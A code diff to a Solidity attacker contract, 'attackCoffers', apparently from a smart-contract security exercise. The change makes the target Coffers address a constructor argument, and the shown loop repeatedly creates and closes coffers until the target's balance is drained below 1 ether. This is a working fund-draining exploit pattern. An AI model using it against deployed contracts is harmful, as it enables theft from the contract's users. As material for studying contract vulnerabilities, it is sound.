@@ -4,8 +4,11 @@ pragma solidity ^0.8.4;
 import "./Coffers.sol";
 
 contract attackCoffers {
-    address coffersAddress = 0xd9145CCE52D386f254917e481eB44e9943F39138;
-    Coffers c = Coffers(coffersAddress);
+    Coffers c;
+
+    constructor(Coffers _contractAddress) {
+        c = Coffers(_contractAddress);
+    }
 
     function attack() public payable {
         c.createCoffer(1);
@@ -14,7 +17,7 @@ contract attackCoffers {
         do {
             c.createCoffer(1);
             c.closeAccount();
-        } while (address(coffersAddress).balance > 1 ether);
+        } while (address(c).balance > 1 ether);
     }
 
     function getBalance() public view returns (uint256) {
@@ -22,7 +25,7 @@ contract attackCoffers {
     }
 
     function getCoffersBalance() public view returns (uint256) {
-        return address(coffersAddress).balance;
+        return address(c).balance;
     }
 
     receive() external payable {}
